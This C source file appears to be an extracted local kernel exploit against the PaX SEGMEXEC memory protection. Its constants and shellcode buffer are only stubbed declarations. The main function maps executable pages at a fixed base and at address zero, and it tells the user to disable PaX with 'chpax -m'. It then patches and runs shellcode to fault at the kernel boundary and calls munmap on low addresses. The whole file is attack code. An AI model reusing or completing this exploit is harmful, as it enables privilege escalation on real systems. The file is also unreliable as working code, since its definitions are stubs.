
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 scalar_t__ MAP1_BASE ;
 int MAP_ANONYMOUS ;
 int MAP_FIXED ;
 int MAP_GROWSDOWN ;
 int MAP_PRIVATE ;
 int PAGE_SIZE ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int SEGMEXEC_TASK_SIZE ;
 int SIGBUS ;
 int fflush (int ) ;
 int fprintf (int ,char*) ;
 int getpid () ;
 int memcpy (void*,scalar_t__,int) ;
 void* mmap (void*,int,int,int,int ,int ) ;
 int mouarf ;
 scalar_t__ mprotect (void*,int,int) ;
 scalar_t__ munmap (int,int) ;
 int perror (char*) ;
 int printf (char*,int,...) ;
 int signal (int ,int ) ;
 int sleep (int) ;
 int stderr ;
 int stdout ;
 scalar_t__ ucode ;

int main( void )
{
int i = 1;
void (* p)();

signal (SIGBUS, mouarf);

if( mmap( (void *) MAP1_BASE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
perror( "mmap map1 base\n" );
return( 1 );
}

if( mmap( (void *) 0x0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
perror( "mmap 0x0 failed\n" );
return( 1 );
}

if( mprotect( (void *) MAP1_BASE, PAGE_SIZE,
PROT_READ | PROT_WRITE | PROT_EXEC ) < 0 )
{
perror( "mprotect map1 base" );
fprintf( stderr, "run chpax -m on this executable\n" );
return( 1 );
}

* (int *) (ucode + 1) = (SEGMEXEC_TASK_SIZE - (PAGE_SIZE * i));
memcpy ((void *)(MAP1_BASE + 600), ucode, 20);
p = (void *) MAP1_BASE + 600;
printf ("--> about to fault on %X\n", SEGMEXEC_TASK_SIZE - (PAGE_SIZE * i));
p ();
printf ("Overlaping the kernel by %d pages\n", i);

fflush( stdout );

printf ("Calling munmap ... %X, %x\n", 0x2000, 0x1000);
if (munmap (0x2000, 0x1000) < 0 )
perror ("munmap");





printf ("PID:%d, sleeping\n", getpid ());
sleep (2000);
return( 0 );
}
